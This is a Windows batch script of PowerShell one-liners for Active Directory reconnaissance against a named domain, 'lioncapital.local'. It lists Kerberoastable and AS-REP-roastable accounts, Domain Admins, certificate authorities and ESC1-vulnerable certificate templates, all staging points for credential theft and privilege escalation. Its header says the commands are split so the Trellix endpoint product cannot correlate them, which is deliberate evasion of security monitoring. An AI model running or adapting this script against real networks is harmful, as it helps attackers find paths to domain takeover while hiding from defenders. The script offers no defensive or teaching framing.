@echo off
setlocal

REM ===============================================
REM manual_one_liners.bat - Manual AD recon via separate powershell -Command calls
REM Run EACH line manually in CMD or PowerShell if all else fails
REM Each line is a single -Command (Trellix can't easily correlate)
REM Output: %TEMP%\ad_manual.log
REM ===============================================

set "OUT=%TEMP%\ad_manual.log"
echo === AD Manual Recon === > "%OUT%"

echo === [1] Domain info ===
powershell -NoProfile -Command "try{$d=[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain();'PDC:'+$d.PdcRoleOwner+', SID:'+$d.DomainSid+', Forest:'+$d.Forest.Name}catch{'ERR:'+$_}" >> "%OUT%" 2>&1
type "%OUT%"

echo.
echo === [2] Kerberoastable ===
powershell -NoProfile -Command "$s=[adsisearcher]'(&(objectCategory=user)(servicePrincipalName=*))';$s.PageSize=1000;$s.FindAll()|%%{$u=$_.GetDirectoryEntry();$u.samaccountname+' -> '+(($u.servicePrincipalName|Select-Object -First 1))}" >> "%OUT%" 2>&1
type "%OUT%"

echo.
echo === [3] AS-REP Roastable ===
powershell -NoProfile -Command "$s=[adsisearcher]'(&(objectCategory=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))';foreach($r in $s.FindAll()){$r.Properties['samaccountname'][0]}" >> "%OUT%" 2>&1
type "%OUT%"

echo.
echo === [4] Domain Admins ===
powershell -NoProfile -Command "$s=[adsisearcher]'(memberOf=CN=Domain Admins,CN=Users,DC=lioncapital,DC=local)';foreach($r in $s.FindAll()){$u=$r.GetDirectoryEntry();$u.samaccountname}" >> "%OUT%" 2>&1
type "%OUT%"

echo.
echo === [5] Cert Publishers ===
powershell -NoProfile -Command "$s=[adsisearcher]'(memberOf=CN=Cert Publishers,CN=Users,DC=lioncapital,DC=local)';foreach($r in $s.FindAll()){$u=$r.GetDirectoryEntry();$u.samaccountname}" >> "%OUT%" 2>&1
type "%OUT%"

echo.
echo === [6] AD CS CAs ===
powershell -NoProfile -Command "$s=[adsisearcher]'(&(objectCategory=pKIEnrollmentService))';foreach($r in $s.FindAll()){$r.Properties['name'][0]+' @ '+$r.Properties['dnshostname'][0]}" >> "%OUT%" 2>&1
type "%OUT%"

echo.
echo === [7] ESC1 Templates ===
powershell -NoProfile -Command "$s=[adsisearcher]'(&(objectClass=pKICertificateTemplate)(msPKI-Certificate-Name-Flag:1.2.840.113556.1.4.803:=1))';foreach($r in $s.FindAll()){$r.Properties['name'][0]}" >> "%OUT%" 2>&1
type "%OUT%"

echo.
echo === [8] Computers (count) ===
powershell -NoProfile -Command "$s=[adsisearcher]'(objectCategory=computer)';$s.PageSize=1000;'Count: '+$s.FindAll().Count" >> "%OUT%" 2>&1
type "%OUT%"

echo.
echo === Done ===
echo Full log: %OUT%
type "%OUT%"
pause
endlocal
